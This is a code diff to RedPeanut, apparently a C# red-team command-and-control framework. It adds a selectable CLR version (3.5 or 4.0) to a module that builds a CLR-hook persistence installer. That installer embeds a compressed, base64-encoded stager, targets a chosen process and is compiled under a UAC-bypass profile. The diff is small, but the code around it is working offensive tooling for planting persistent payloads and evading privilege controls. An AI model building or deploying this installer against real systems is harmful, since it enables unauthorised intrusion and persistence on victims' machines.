@@ -19,6 +19,7 @@ namespace RedPeanut
         public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
         {
             { "set process", "Parent process" },
+            { "set clrversion", "Sel target CLR version (35,40)" },
             { "set uninstall", "Partial uninstallation. Restore the environment variable, but the assembly must be deleted manually." },
             { "run", "Execute module" },
             { "options", "Print current config" },
@@ -36,6 +37,7 @@ namespace RedPeanut
         string modulename = "clr";
         string process = "";
         bool uninstall = false;
+        int clrversion = 40;
         //bool ssl = true;
         bool exit = false;
 
@@ -73,6 +75,9 @@ namespace RedPeanut
                     {
                         case "set process":
                             process = GetParsedSetString(input);
+                            break;
+                        case "set clrversion":
+                            clrversion = GetParsedSetInt(input);
                             break;
                         case "set uninstall":
                             uninstall = GetParsedSetBool(input);
@@ -157,11 +162,15 @@ namespace RedPeanut
 
                         string keyfilename = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, KEYFILE_FOLDER, "key.snk");
 
+                        if (clrversion != 35 && clrversion != 40)
+                            clrversion = 40;
+
                         source = File.ReadAllText(Path.Combine(folderrpath, CLRHOOKINSTALL_TEMPLATE))
                             .Replace("#KEYFILE#", Convert.ToBase64String(CompressGZipAssembly(File.ReadAllBytes(keyfilename))))
                             .Replace("#STAGER#", stagerstr)
                             .Replace("#FILENAME#", hookfilename)
-                            .Replace("#PROCESS#", process);
+                            .Replace("#PROCESS#", process)
+                            .Replace("#CLRVERSION#", clrversion.ToString());
 
                         string clrhookinstaller = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework, compprofile: CompilationProfile.UACBypass)));
 
@@ -183,6 +192,7 @@ namespace RedPeanut
             Dictionary<string, string> properties = new Dictionary<string, string>
             {
                 { "process", process },
+                { "clrversion", clrversion.ToString() },
                 { "delete", uninstall.ToString() }
             };
 
